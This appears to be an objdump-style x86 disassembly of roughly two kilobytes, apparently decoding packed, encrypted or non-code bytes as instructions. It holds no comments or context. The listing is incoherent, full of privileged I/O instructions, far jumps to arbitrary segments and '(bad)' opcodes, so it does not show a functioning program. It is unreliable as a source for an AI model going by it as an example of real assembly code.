  41a31b:	je     0x41a31d
  41a31d:	ror    ebp,cl
  41a31f:	ja     0x41a2a5
  41a321:	push   cs
  41a322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a323:	mov    eax,DWORD PTR [edx-0x500e88b0]
  41a329:	loope  0x41a2d5
  41a32b:	pusha  
  41a32c:	in     eax,dx
  41a32d:	push   edx
  41a32e:	fsubr  DWORD PTR [ebx]
  41a330:	test   DWORD PTR [edi-0x55],esi
  41a333:	call   0xc503:0x82cbfe4a
  41a33a:	es clc 
  41a33c:	fs dec esp
  41a33e:	mov    esp,0x8eab1418
  41a343:	rcl    BYTE PTR [ecx+eax*8+0x7a],cl
  41a347:	pop    edi
  41a348:	pushf  
  41a349:	sbb    al,BYTE PTR [esi+0x417b2d67]
  41a34f:	sti    
  41a350:	fstp   QWORD PTR [esi+0x5f03b98f]
  41a356:	daa    
  41a357:	fstp   QWORD PTR [edi-0x39709fa3]
  41a35d:	sub    al,0x63
  41a35f:	sar    ebp,1
  41a361:	inc    edi
  41a362:	jo     0x41a31c
  41a364:	inc    edx
  41a365:	icebp  
  41a366:	bound  edi,QWORD PTR [ebx-0x4bb7c91d]
  41a36c:	pop    ss
  41a36d:	inc    edx
  41a36e:	mov    ebx,0x6422d963
  41a373:	call   0xc612:0x44e1256f
  41a37a:	stos   DWORD PTR es:[edi],eax
  41a37b:	or     ch,BYTE PTR [edx+0x4420d957]
  41a381:	and    esi,DWORD PTR [ecx+eiz*1+0x2ff12d54]
  41a388:	test   DWORD PTR [esi],edi
  41a38a:	fmul   QWORD PTR [esi]
  41a38c:	retf   
  41a38d:	mov    esi,0x77ff56fa
  41a392:	mov    ah,ch
  41a394:	imul   eax,ecx,0xffffffe5
  41a397:	mov    WORD PTR [ebp+0x16],?
  41a39a:	mov    esp,DWORD PTR [eax+ebx*2-0x37aa8854]
  41a3a1:	out    0x98,al
  41a3a3:	hlt    
  41a3a4:	dec    eax
  41a3a5:	ja     0x41a3ee
  41a3a7:	adc    al,0x36
  41a3a9:	adc    edx,eax
  41a3ab:	icebp  
  41a3ac:	adc    DWORD PTR [eax+0x23],0x87c8aff0
  41a3b3:	out    dx,al
  41a3b4:	cmc    
  41a3b5:	dec    esp
  41a3b6:	inc    edx
  41a3b7:	mov    esp,0xea176ad
  41a3bc:	fsubr  QWORD PTR [ecx]
  41a3be:	and    BYTE PTR [eax],bl
  41a3c0:	adc    esi,eax
  41a3c2:	outs   dx,BYTE PTR ds:[esi]
  41a3c3:	ja     0x41a384
  41a3c5:	pop    ss
  41a3c6:	(bad)  
  41a3c7:	aad    0xca
  41a3c9:	push   0xf62c7c41
  41a3ce:	inc    ecx
  41a3cf:	in     al,0x15
  41a3d1:	sub    al,0x4f
  41a3d3:	out    dx,eax
  41a3d4:	dec    ebx
  41a3d5:	push   0x4c
  41a3d7:	ficomp WORD PTR [esi-0x14]
  41a3da:	repnz sahf 
  41a3dc:	jno    0x41a3a3
  41a3de:	cwde   
  41a3df:	push   ebx
  41a3e0:	das    
  41a3e1:	aad    0xa9
  41a3e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3e4:	shr    BYTE PTR [esi],cl
  41a3e6:	jmp    0x2e7634b9
  41a3eb:	mov    esp,DWORD PTR [esi]
  41a3ed:	or     al,ah
  41a3ef:	inc    ebx
  41a3f0:	jno    0x41a3db
  41a3f2:	sub    al,0x5f
  41a3f4:	fst    DWORD PTR [ebp+0x76]
  41a3f7:	not    DWORD PTR [ebx+0x5e]
  41a3fa:	out    dx,eax
  41a3fb:	mov    ds:0xd5970cff,al
  41a400:	pop    esp
  41a401:	addr16 cs clc 
  41a404:	jl     0x41a43d
  41a406:	xchg   BYTE PTR [ebx],dh
  41a408:	xor    bl,dl
  41a40a:	mov    esp,0x376a29a9
  41a40f:	jmp    0xc015:0x925d8792
  41a416:	stc    
  41a417:	pushf  
  41a418:	aad    0x9c
  41a41a:	add    DWORD PTR ds:0x2a70702b,0x43
  41a421:	xchg   esi,eax
  41a422:	jne    0x41a478
  41a424:	add    eax,0xdcd2fd3f
  41a429:	int3   
  41a42a:	rcr    BYTE PTR [edi+0x51b3ea8a],1
  41a430:	lods   eax,DWORD PTR ds:[esi]
  41a431:	ins    BYTE PTR es:[edi],dx
  41a432:	sbb    ah,BYTE PTR ds:0x56f4a8cf
  41a439:	or     al,0x50
  41a43b:	push   esi
  41a43c:	push   ss
  41a43d:	out    0x5a,eax
  41a43f:	sub    ecx,esp
  41a441:	lock out dx,al
  41a443:	scas   eax,DWORD PTR es:[edi]
  41a444:	add    BYTE PTR [edi-0x1de76dee],dh
  41a44a:	cmp    esp,DWORD PTR [ecx]
  41a44c:	icebp  
  41a44d:	push   0xd8c733d3
  41a452:	or     DWORD PTR [ebx+0x1f],0x122dcb2c
  41a459:	pop    es
  41a45a:	sub    eax,0x142cd021
  41a45f:	cwde   
  41a460:	pop    ecx
  41a461:	sub    eax,0x475a870a
  41a466:	pop    ds
  41a467:	jecxz  0x41a4ae
  41a469:	and    BYTE PTR [ebp-0x6cb58e4f],ch
  41a46f:	leave  
  41a470:	jne    0x41a43c
  41a472:	loopne 0x41a4e0
  41a474:	sub    eax,0x9a3d4345
  41a479:	add    al,0xd9
  41a47b:	icebp  
  41a47c:	dec    ebx
  41a47d:	mov    dh,0xf2
  41a47f:	inc    ebx
  41a480:	xchg   ebp,eax
  41a481:	cmc    
  41a482:	pusha  
  41a483:	dec    eax
  41a484:	push   cs
  41a485:	sbb    al,0xe4
  41a487:	jns    0x41a464
  41a489:	jns    0x41a42a
  41a48b:	push   ds
  41a48c:	repnz or bl,BYTE PTR [esi+0x253ec38e]
  41a493:	adc    edx,ebx
  41a495:	fmul   DWORD PTR [edx]
  41a497:	cmp    ecx,eax
  41a499:	pop    eax
  41a49a:	mov    edx,0x3d7e7cbe
  41a49f:	sbb    BYTE PTR [edi],al
  41a4a1:	push   0x2b
  41a4a3:	sbb    DWORD PTR [edx+0x47],0x4209c2f7
  41a4aa:	sub    esp,edx
  41a4ac:	push   cs
  41a4ad:	pop    esi
  41a4ae:	mov    al,ds:0x85ab1610
  41a4b3:	icebp  
  41a4b4:	dec    ecx
  41a4b5:	shl    DWORD PTR [edi-0xa],1
  41a4b8:	(bad)  
  41a4b9:	cwde   
  41a4ba:	jg     0x41a45c
  41a4bc:	xor    eax,0x5ce1008c
  41a4c1:	or     dh,BYTE PTR [ebp+0x65]
  41a4c4:	push   cs
  41a4c5:	pusha  
  41a4c6:	xchg   edi,eax
  41a4c7:	pop    ss
  41a4c8:	das    
  41a4c9:	cwde   
  41a4ca:	mov    al,BYTE PTR [edi-0x40]
  41a4cd:	out    dx,al
  41a4ce:	bound  esp,QWORD PTR [edi+0x4a]
  41a4d1:	xchg   esi,eax
  41a4d2:	(bad)  
  41a4d3:	retf   0x67a1
  41a4d6:	imul   ebx,esp,0x47
  41a4d9:	xlat   BYTE PTR ds:[ebx]
  41a4da:	in     eax,0xba
  41a4dc:	fcompp 
  41a4de:	arpl   WORD PTR [eax-0x54],di
  41a4e1:	inc    ebx
  41a4e2:	ret    
  41a4e3:	je     0x41a4af
  41a4e5:	aas    
  41a4e6:	ret    
  41a4e7:	xchg   esi,eax
  41a4e8:	mov    DWORD PTR [eax+edx*4],ecx
  41a4eb:	adc    DWORD PTR [ecx],0x4df2ec65
  41a4f1:	xchg   ebx,eax
  41a4f2:	jp     0x41a4c5
  41a4f4:	xor    BYTE PTR [edx-0x8bb497a],bl
  41a4fa:	mov    ah,0xfd
  41a4fc:	mov    edi,0xe1db7954
  41a501:	xor    dl,BYTE PTR [edi]
  41a503:	mov    esi,0x2b6b37df
  41a508:	mov    ecx,0xe3f7ee43
  41a50d:	out    dx,al
  41a50e:	loopne 0x41a559
  41a510:	mov    dl,BYTE PTR [ebx+0x5]
  41a513:	repz loop 0x41a4e6
  41a516:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a517:	mov    dh,0xcc
  41a519:	jmp    0x7ff34e1b
  41a51e:	(bad)  [ebp+0x38cd48ec]
  41a524:	push   0xe44b504f
  41a529:	data16 ins BYTE PTR es:[edi],dx
  41a52b:	inc    esi
  41a52c:	int3   
  41a52d:	pop    eax
  41a52e:	push   eax
  41a52f:	push   ecx
  41a530:	es daa 
  41a532:	push   esi
  41a533:	jne    0x41a4e3
  41a535:	(bad)  
  41a537:	mov    esp,0xe1b7aa1f
  41a53c:	adc    al,0xcc
  41a53e:	das    
  41a53f:	(bad)  
  41a540:	gs mov ch,0xe7
  41a543:	mov    ds:0xe432584e,al
  41a548:	pop    edx
  41a549:	ins    DWORD PTR es:[edi],dx
  41a54a:	mov    ah,0x81
  41a54c:	jg     0x41a555
  41a54e:	and    BYTE PTR [ebx+0x29],0xb3
  41a552:	sbb    esp,DWORD PTR [eax-0xc07d9d3]
  41a558:	test   eax,ebx
  41a55a:	and    BYTE PTR [eax],bh
  41a55c:	xchg   ecx,eax
  41a55d:	daa    
  41a55e:	jae    0x41a5b7
  41a560:	je     0x41a54d
  41a562:	mov    BYTE PTR [edi+0x17c236c2],0x6a
  41a569:	mov    bl,0xaf
  41a56b:	push   cs
  41a56c:	adc    esp,DWORD PTR [ebp+0x58]
  41a56f:	adc    al,BYTE PTR [eax-0x158e4a77]
  41a575:	inc    esp
  41a576:	cmp    dh,BYTE PTR [eax+0x47]
  41a579:	cmp    ah,BYTE PTR [ecx-0x19]
  41a57c:	mov    ebx,0x70f8668b
  41a581:	sub    DWORD PTR [edi+0x5a1f7c51],edi
  41a587:	mov    ch,BYTE PTR [esi*4+0x3463be3c]
  41a58e:	loop   0x41a5ee
  41a590:	repz das 
  41a592:	les    edx,FWORD PTR [ecx]
  41a594:	cmp    DWORD PTR [ecx+0x1ffe551e],ecx
  41a59a:	mov    ecx,0x6a98c819
  41a59f:	pop    ebx
  41a5a0:	xchg   ebx,eax
  41a5a1:	inc    ecx
  41a5a2:	inc    ecx
  41a5a3:	sbb    BYTE PTR [esi],cl
  41a5a5:	jmp    0x56937dbf
  41a5aa:	mov    ebp,0x32cd80b
  41a5af:	je     0x41a5e6
  41a5b1:	inc    eax
  41a5b2:	call   0x4759:0xbfa82931
  41a5b9:	jp     0x41a544
  41a5bb:	pop    ebx
  41a5bc:	xor    eax,0x6356cb14
  41a5c1:	pop    esi
  41a5c2:	mov    al,ds:0xb02ef194
  41a5c7:	cli    
  41a5c8:	xor    al,0x84
  41a5ca:	mov    DWORD PTR [eax+0x3af11071],esp
  41a5d0:	imul   esp,DWORD PTR [esi+0x56],0x5c
  41a5d4:	adc    DWORD PTR [ebp+0x663262db],ebp
  41a5da:	pop    ebp
  41a5db:	xchg   edx,eax
  41a5dc:	shl    BYTE PTR [ebx-0x30f3d826],1
  41a5e2:	xor    bl,BYTE PTR [ebx-0x2b]
  41a5e5:	mov    eax,0x7e414a99
  41a5ea:	cmc    
  41a5eb:	in     al,0x7a
  41a5ed:	jbe    0x41a5f9
  41a5ef:	lahf   
  41a5f0:	push   ecx
  41a5f1:	js     0x41a5ea
  41a5f3:	xchg   edx,eax
  41a5f4:	shr    ebx,0xb2
  41a5f7:	jle    0x41a5d9
  41a5f9:	or     bh,BYTE PTR ds:0x5735bf1f
  41a5ff:	add    eax,0xb231f776
  41a604:	or     bh,cl
  41a606:	xor    bl,BYTE PTR [edx]
  41a608:	push   ds
  41a609:	into   
  41a60a:	mov    bl,0x90
  41a60c:	mov    esp,0x55de75fe
  41a611:	lods   al,BYTE PTR ds:[esi]
  41a612:	out    0x4a,al
  41a614:	add    al,0x11
  41a616:	pop    edi
  41a617:	dec    ebx
  41a618:	pop    esi
  41a619:	dec    esi
  41a61a:	sahf   
  41a61b:	push   ecx
  41a61c:	jmp    0xcae482bc
  41a621:	pop    eax
  41a622:	add    ebp,ecx
  41a624:	vcmpsd xmm7,xmm7,QWORD PTR [edx+0x4],0x24
  41a62a:	repz (bad) 
  41a62c:	or     edi,DWORD PTR [eax-0x68afc525]
  41a632:	push   ecx
  41a633:	retf   
  41a634:	ror    BYTE PTR [ebp+0x5d28927f],1
  41a63a:	mov    dl,0x36
  41a63c:	mov    edx,0x3a490b10
  41a641:	enter  0xe20d,0x8f
  41a645:	cdq    
  41a646:	nop
  41a647:	mov    ah,0xe3
  41a649:	ja     0x41a6b4
  41a64b:	lds    ecx,FWORD PTR [ebx+edi*4-0x4822834d]
  41a652:	jecxz  0x41a621
  41a654:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a655:	sbb    BYTE PTR [ecx-0x80],0xde
  41a659:	add    al,0x48
  41a65b:	fwait
  41a65c:	cmp    BYTE PTR [ebx+0x7d],ch
  41a65f:	xlat   BYTE PTR ds:[ebx]
  41a660:	gs scas al,BYTE PTR es:[edi]
  41a662:	mov    edx,0xf767944f
  41a667:	add    ch,BYTE PTR [edx]
  41a669:	dec    esi
  41a66a:	repz fs test eax,0x3c9d2dc1
  41a671:	lods   eax,DWORD PTR ds:[esi]
  41a672:	dec    ebp
  41a673:	imul   edi
  41a675:	xlat   BYTE PTR ds:[ebx]
  41a676:	adc    dl,bh
  41a678:	jecxz  0x41a632
  41a67a:	push   ebx
  41a67b:	jmp    0x41a64f
  41a67d:	sub    eax,0xbf72b12a
  41a682:	nop
  41a683:	inc    edx
  41a684:	xchg   esp,eax
  41a685:	shl    DWORD PTR [ecx+0x4295cd9e],cl
  41a68b:	mov    esp,?
  41a68d:	jmp    0x41a661
  41a68f:	sbb    edx,DWORD PTR [ecx-0x7d]
  41a692:	call   0xa38093b9
  41a697:	mov    edx,0xb07c683d
  41a69c:	outs   dx,BYTE PTR ds:[esi]
  41a69d:	jnp    0x41a626
  41a69f:	jecxz  0x41a6d3
  41a6a1:	push   ds
  41a6a2:	cmp    BYTE PTR [esi],ah
  41a6a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6a5:	pop    edi
  41a6a6:	cmc    
  41a6a7:	jge    0x41a713
  41a6a9:	ret    0xe08d
  41a6ac:	fisttp WORD PTR [esi]
  41a6ae:	out    dx,al
  41a6af:	cmp    eax,0x41157666
  41a6b4:	cmp    eax,0x2c3e570d
  41a6b9:	jno    0x41a6d5
  41a6bb:	scas   eax,DWORD PTR es:[edi]
  41a6bc:	mul    DWORD PTR [ebp+0x7a074af9]
  41a6c2:	mov    WORD PTR ds:0x3dcd3c80,es
  41a6c8:	mov    ds:0x84991978,eax
  41a6cd:	icebp  
  41a6ce:	shr    BYTE PTR [edx+0xf],1
  41a6d1:	pushf  
  41a6d2:	sub    eax,0x6fc3ba5
  41a6d7:	xor    al,0xb0
  41a6d9:	mov    ds:0x85baee37,eax
  41a6de:	mov    edx,0xb5bbda98
  41a6e3:	dec    esi
  41a6e4:	fst    QWORD PTR [ebx]
  41a6e6:	jne    0x41a71b
  41a6e8:	push   cs
  41a6e9:	cmp    esi,DWORD PTR [eax+0x80d21f2]
  41a6ef:	mov    edx,DWORD PTR [ebp-0x78344512]
  41a6f5:	or     DWORD PTR [edi+ebx*4-0x361b23e9],ebx
  41a6fc:	pop    ss
  41a6fd:	sbb    DWORD PTR [esp+ebp*1+0xe38d932],eax
  41a704:	fild   WORD PTR [edx]
  41a706:	push   cs
  41a707:	xchg   DWORD PTR es:[ecx+0x6a6d7669],esp
  41a70e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a70f:	js     0x41a697
  41a711:	rol    BYTE PTR [edi-0x7f466fd4],0xe6
  41a718:	cmp    BYTE PTR [ecx+0x499eb2be],ah
  41a71e:	pop    esp
  41a71f:	aaa    
  41a720:	call   0x55bd:0x6b48fe0f
  41a727:	jecxz  0x41a744
  41a729:	cmp    ch,BYTE PTR ds:0x9684d080
  41a72f:	pop    ds
  41a730:	mov    ds:0xa2e23e17,al
  41a735:	xchg   bl,ah
  41a737:	mov    dl,0x87
  41a739:	lods   eax,DWORD PTR ds:[esi]
  41a73a:	rcl    BYTE PTR [esi-0x60ca98ff],0x33
  41a741:	jmp    0x41a777
  41a743:	in     al,dx
  41a744:	fidiv  DWORD PTR ds:[esp+ebx*4+0x59960938]
  41a74c:	or     bl,BYTE PTR [edx-0x33]
  41a74f:	push   cs
  41a750:	cwde   
  41a751:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a752:	std    
  41a753:	mov    ebp,0x4a7e912
  41a758:	aaa    
  41a759:	(bad)  
  41a75a:	popf   
  41a75b:	or     DWORD PTR ds:0x258b7548,edx
  41a761:	stos   DWORD PTR es:[edi],eax
  41a762:	dec    edi
  41a763:	xor    eax,0x7d552a39
  41a768:	mov    edi,0xf8651e95
  41a76d:	push   edx
  41a76e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a76f:	enter  0x7db1,0x73
  41a773:	repnz popf 
  41a775:	mov    ecx,0x213f222b
  41a77a:	cld    
  41a77b:	add    al,0x44
  41a77d:	lea    esp,[esi]
  41a77f:	inc    edi
  41a780:	rol    BYTE PTR [ebx+0x47a1ff2d],1
  41a786:	les    edi,FWORD PTR [eax-0x3c375704]
  41a78c:	jnp    0x41a7a9
  41a78e:	pop    ecx
  41a78f:	mov    eax,ds:0xe27decce
  41a794:	in     al,dx
  41a795:	call   0xd05336ee
  41a79a:	lea    edx,[ecx-0x4e]
  41a79d:	fisub  DWORD PTR [ebx]
  41a79f:	xor    eax,0x93ac7488
  41a7a4:	sbb    eax,0x5b0ff97c
  41a7a9:	jge    0x41a753
  41a7ab:	dec    esp
  41a7ac:	add    al,bh
  41a7ae:	mov    al,ds:0xa1151d12
  41a7b3:	cmp    ebx,DWORD PTR [edx-0x6b970bf8]
  41a7b9:	mov    ebp,0xd8761904
  41a7be:	xor    ebx,0x29
  41a7c1:	les    edx,FWORD PTR [edi]
  41a7c3:	dec    esp
  41a7c4:	das    
  41a7c5:	(bad)  
  41a7c6:	shr    DWORD PTR [esi+0x4ae6ea43],cl
  41a7cc:	sti    
  41a7cd:	inc    ecx
  41a7ce:	shl    BYTE PTR [esi-0x60],cl
  41a7d1:	imul   ebp,DWORD PTR [eax+0x6],0x9d193d69
  41a7d8:	(bad)  
  41a7d9:	in     al,0x9c
  41a7db:	sub    al,0x2d
  41a7dd:	out    0x15,al
  41a7df:	in     eax,dx
  41a7e0:	inc    eax
  41a7e1:	ffree  st(7)
  41a7e3:	dec    ebx
  41a7e4:	sti    
  41a7e5:	pusha  
  41a7e6:	test   BYTE PTR [ecx],cl
  41a7e8:	sti    
  41a7e9:	in     eax,0x68
  41a7eb:	rol    DWORD PTR [ebx+0x25f0f800],0x8e
  41a7f2:	addr16 in eax,0xd5
  41a7f5:	adc    al,0xa1
  41a7f7:	cmp    ebx,0x38
  41a7fa:	mov    dl,dh
  41a7fc:	scas   eax,DWORD PTR es:[edi]
  41a7fd:	rcr    ah,cl
  41a7ff:	call   0xdfbf:0x2b2fdca5
  41a806:	sub    al,0xa0
  41a808:	mov    WORD PTR [edx],?
  41a80a:	ret    0x77a7
  41a80d:	(bad)  
  41a80f:	xchg   ah,al
  41a811:	scas   eax,DWORD PTR es:[edi]
  41a812:	dec    ecx
  41a813:	jne    0x41a891
  41a815:	fdiv   QWORD PTR [edx+0x20b7f9c0]
  41a81b:	xchg   edi,eax
  41a81c:	call   0x6801797d
  41a821:	(bad)  
  41a822:	test   DWORD PTR [esi-0x1b152952],ebx
  41a828:	hlt    
  41a829:	dec    ebx
  41a82a:	jl     0x41a84d
  41a82c:	dec    ebp
  41a82d:	mov    ebp,0xf46bab5a
  41a832:	push   ecx
  41a833:	punpckhbw mm1,QWORD PTR [esi-0x3a]
  41a837:	mov    cl,0x7a
  41a839:	ret    0xa49b
  41a83c:	pop    esp
  41a83d:	fstp   TBYTE PTR [eax-0x6e6acc7e]
  41a843:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a844:	test   DWORD PTR [eax+0xf7a7ebd],edi
  41a84a:	shl    BYTE PTR [ebx-0x4a],cl
  41a84d:	repnz sub ecx,ecx
  41a850:	call   DWORD PTR [edi+0x64b5356b]
  41a856:	hlt    
  41a857:	adc    bl,BYTE PTR [ecx+ecx*1]
  41a85a:	dec    ebx
  41a85b:	cs and eax,0x161ded8a
  41a861:	leave  
  41a862:	adc    al,0xfb
  41a864:	and    ecx,DWORD PTR [ecx+0x44]
  41a867:	scas   eax,DWORD PTR es:[edi]
  41a868:	mov    ch,BYTE PTR [ebx-0x3]
  41a86b:	fcmovnb st,st(5)
  41a86d:	ins    DWORD PTR es:[edi],dx
  41a86e:	icebp  
  41a86f:	sti    
  41a870:	lahf   
  41a871:	sub    DWORD PTR [edi-0x6a],ebp
  41a874:	popf   
  41a875:	int3   
  41a876:	dec    ebx
  41a877:	aas    
  41a878:	xchg   BYTE PTR [ecx+ebp*1],bh
  41a87b:	mov    bh,dh
  41a87d:	fnstcw WORD PTR [edx+0x57b33468]
  41a883:	mov    cl,ch
  41a885:	clc    
  41a886:	leave  
  41a887:	pushf  
  41a888:	adc    eax,0x55256e31
  41a88d:	mov    ds:0xa0257a1e,al
  41a892:	sbb    al,0xbd
  41a894:	lods   eax,DWORD PTR ds:[esi]
  41a895:	div    DWORD PTR [ebx]
  41a897:	fdivr  QWORD PTR [ecx-0xf]
  41a89a:	sub    BYTE PTR [eax-0x3bc17b8],0xc
  41a8a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8a2:	jg     0x41a8bf
  41a8a4:	jmp    0x41a8a5
  41a8a6:	test   BYTE PTR [ecx-0x510ddb25],ah
  41a8ac:	je     0x41a8d5
  41a8ae:	or     DWORD PTR [edx],edx
  41a8b0:	sar    BYTE PTR [esi],cl
  41a8b2:	sbb    DWORD PTR [ebx+0x34],eax
  41a8b5:	add    edx,DWORD PTR [eax]
  41a8b7:	rol    BYTE PTR [ebp-0x61431e8b],cl
  41a8bd:	mov    DWORD PTR [ebp+0x45],0xfa200401
  41a8c4:	mov    ds:0xb4748a1e,eax
  41a8c9:	dec    edx
  41a8ca:	pushf  
  41a8cb:	mov    ebx,0xb7453f24
  41a8d0:	(bad)  
  41a8d2:	jne    0x41a88a
  41a8d4:	ss inc ecx
  41a8d6:	leave  
  41a8d7:	test   eax,0x5a9acfa5
  41a8dc:	std    
  41a8dd:	push   ecx
  41a8de:	stos   DWORD PTR es:[edi],eax
  41a8df:	js     0x41a913
  41a8e1:	enter  0x1ed1,0xfe
  41a8e5:	jno    0x41a902
  41a8e7:	bnd jbe 0x41a8ad
  41a8ea:	fidivr WORD PTR [esi]
  41a8ec:	push   ebp
  41a8ed:	mov    ah,0x26
  41a8ef:	fldenv [edi]
  41a8f1:	sbb    al,0xb6
  41a8f3:	cmp    DWORD PTR [ebx+0x42],ecx
  41a8f6:	push   esi
  41a8f7:	(bad)  
  41a8f8:	adc    eax,DWORD PTR [eax+0x7a]
  41a8fb:	mov    ds:0xbd91bbf4,eax
  41a900:	push   ecx
  41a901:	retf   
  41a902:	test   edx,esp
  41a904:	push   eax
  41a905:	ins    BYTE PTR es:[edi],dx
  41a906:	push   0x88c1641a
  41a90b:	ret    
  41a90c:	cmp    DWORD PTR [edx],edi
  41a90e:	inc    esi
  41a90f:	lock cmp BYTE PTR [edx],0x3c
  41a913:	pop    ss
  41a914:	call   0x2903:0x8bd72f7f
  41a91b:	and    dl,BYTE PTR [edx+0x7ec7a421]
  41a921:	les    edx,FWORD PTR [ebx]
  41a923:	mov    al,0xd
  41a925:	or     dh,BYTE PTR [edi]
  41a927:	mov    ebp,0xeeec7a0c
  41a92c:	push   0x45
  41a92e:	das    
  41a92f:	leave  
  41a930:	outs   dx,DWORD PTR ds:[esi]
  41a931:	ins    BYTE PTR es:[edi],dx
  41a932:	out    dx,eax
  41a933:	shr    dl,0xf
  41a936:	mov    cl,0x4e
  41a938:	jns    0x41a990
  41a93a:	call   0x472357ec
  41a93f:	test   eax,0xd40941fa
  41a944:	mov    esp,0xbf9ab202
  41a949:	dec    esp
  41a94a:	daa    
  41a94b:	mov    ebx,0x22e7d976
  41a950:	jecxz  0x41a900
  41a952:	mov    eax,DWORD PTR [esi-0x1c]
  41a955:	retf   0x5c52
  41a958:	scas   eax,DWORD PTR es:[edi]
  41a959:	xchg   edx,eax
  41a95a:	jne    0x41a901
  41a95c:	and    al,0xd7
  41a95e:	and    ah,al
  41a960:	inc    edx
  41a961:	xchg   DWORD PTR [esi+0x36],ebp
  41a964:	ss xchg ebx,esi
  41a967:	push   ebx
  41a968:	xor    al,0x10
  41a96a:	imul   eax,DWORD PTR [ebp-0x20],0xffffff98
  41a96e:	mov    bh,0xa5
  41a970:	call   0xbd15:0xa5832020
  41a977:	addr16 push edx
  41a979:	fdivr  st(7),st
  41a97b:	aaa    
  41a97c:	sbb    BYTE PTR [edx+0x20e974e6],bl
  41a982:	mov    edx,0xfd2ee1ee
  41a987:	out    dx,eax
  41a988:	xchg   esp,eax
  41a989:	mov    dl,0x7f
  41a98b:	jnp    0x41a92c
  41a98d:	push   esi
  41a98e:	mov    edi,0x57a5c766
  41a993:	inc    ebx
  41a994:	test   eax,0xf0d7d3ba
  41a999:	xor    ah,bh
  41a99b:	mov    bl,cl
  41a99d:	add    eax,0x499b9f97
  41a9a2:	sahf   
  41a9a3:	dec    ecx
  41a9a4:	and    eax,0x7fa2a80
  41a9a9:	scas   eax,DWORD PTR es:[edi]
  41a9aa:	mov    esi,edx
  41a9ac:	cmp    ch,al
  41a9ae:	push   0x335c2789
  41a9b3:	or     cl,BYTE PTR [ecx-0x5e]
  41a9b6:	inc    esi
  41a9b7:	int    0xf9
  41a9b9:	add    al,dl
  41a9bb:	jp     0x41a99d
  41a9bd:	pop    ecx
  41a9be:	mov    BYTE PTR [ecx],dl
  41a9c0:	jmp    0xff5d:0x25728bb6
  41a9c7:	sub    DWORD PTR ds:0xb46b648b,edx
  41a9cd:	pop    eax
  41a9ce:	xchg   esi,eax
  41a9cf:	hlt    
  41a9d0:	fldl2t 
  41a9d2:	arpl   WORD PTR [edi+ebp*8+0x2e],sp
  41a9d6:	ja     0x41a9c9
  41a9d8:	jg     0x41aa54
  41a9da:	ror    BYTE PTR [ecx+0x4],0x91
  41a9de:	xor    BYTE PTR [eax],bl
  41a9e0:	or     eax,0x433807a1
  41a9e5:	mov    edx,0x195676e5
  41a9ea:	sbb    BYTE PTR [eax-0x69cbfa54],bh
  41a9f0:	retf   
  41a9f1:	icebp  
  41a9f2:	ret    0x24a4
  41a9f5:	jne    0x41a9d0
  41a9f7:	cmp    esi,edi
  41a9f9:	mov    ch,BYTE PTR [ebp-0x17]
  41a9fc:	or     ebx,esp
  41a9fe:	inc    ecx
  41a9ff:	fidiv  DWORD PTR [eax+eax*4-0x7c4992b4]
  41aa06:	sub    DWORD PTR [edi-0x43dce4e3],0x29bae2b8
  41aa10:	inc    esp
  41aa11:	aad    0xb9
  41aa13:	mov    dl,0x7e
  41aa15:	dec    esi
  41aa16:	enter  0x2c08,0xda
  41aa1a:	imul   edx,DWORD PTR [ecx+0x7b57e84f],0xfffffff1
  41aa21:	out    0x9,al
  41aa23:	ss jmp 0xa20de92e
  41aa29:	xchg   esi,eax
  41aa2a:	adc    DWORD PTR [eax],ecx
  41aa2c:	in     al,0xe8
  41aa2e:	sbb    DWORD PTR [ecx],ecx
  41aa30:	sti    
  41aa31:	mov    al,0x84
  41aa33:	sbb    eax,0xd66e3382
  41aa38:	(bad)  
  41aa39:	pop    ds
  41aa3a:	adc    dl,BYTE PTR [eax-0x209d1c8]
  41aa40:	call   0x745:0x81efb113
  41aa47:	xor    eax,DWORD PTR [ecx+0x18]
  41aa4a:	imul   edx,DWORD PTR [edx+esi*2],0xe7527646
  41aa51:	mov    ds:0x12c1e725,eax
  41aa56:	inc    esp
  41aa57:	mov    ah,BYTE PTR [ebx+ecx*1-0x9]
  41aa5b:	test   BYTE PTR [ebx+esi*1+0xf127ec],bh
  41aa62:	loope  0x41aa92
  41aa64:	repz jp 0x41a9f5
  41aa67:	ret    0x4e4b
  41aa6a:	icebp  
  41aa6b:	mov    ds:0x5a1fa1a2,al
  41aa70:	push   ecx
  41aa71:	sub    BYTE PTR [esi-0x53],cl
  41aa74:	ret    0x5aaf
  41aa77:	stos   DWORD PTR es:[edi],eax
  41aa78:	jo     0x41aa01
  41aa7a:	lea    ebp,[esi+0x58206af9]
  41aa80:	es cs loope 0x41aae7
  41aa84:	pop    ss
  41aa85:	inc    eax
  41aa86:	jge    0x41aabc
  41aa88:	add    al,BYTE PTR [ebx+0x6837f5e2]
  41aa8e:	sub    esp,DWORD PTR [edi]
  41aa90:	fdivp  st(5),st
  41aa92:	jmp    0x41ab13
  41aa94:	adc    DWORD PTR fs:[edi-0x6d],esp
  41aa98:	ret    
  41aa99:	xor    BYTE PTR [esi-0x7d],ah
  41aa9c:	mov    ebx,0xab9481d8
  41aaa1:	inc    esp
  41aaa2:	jmp    0x41aac3
  41aaa4:	cmp    dh,BYTE PTR ds:0x8e5c00d
  41aaaa:	jmp    0x41aacc
  41aaac:	mov    dh,0x27
  41aaae:	and    DWORD PTR [ebp-0x7cebe8f2],edx
  41aab4:	mov    ebx,0x44e532a9
  41aab9:	retf   
  41aaba:	into   
  41aabb:	push   0xffffffb2
  41aabd:	aaa    
  41aabe:	jle    0x41ab3a
  41aac0:	xchg   ebx,eax
  41aac1:	out    dx,eax
  41aac2:	mov    esp,0x387682a9
  41aac7:	mov    eax,0xc0ba4a12
  41aacc:	jns    0x41aaa8
  41aace:	call   0xd541:0xf243b421
  41aad5:	jno    0x41ab25
  41aad7:	or     ah,BYTE PTR [eax+ecx*1+0x51618988]
  41aade:	push   edi
  41aadf:	leave  
  41aae0:	retf   
  41aae1:	clc    
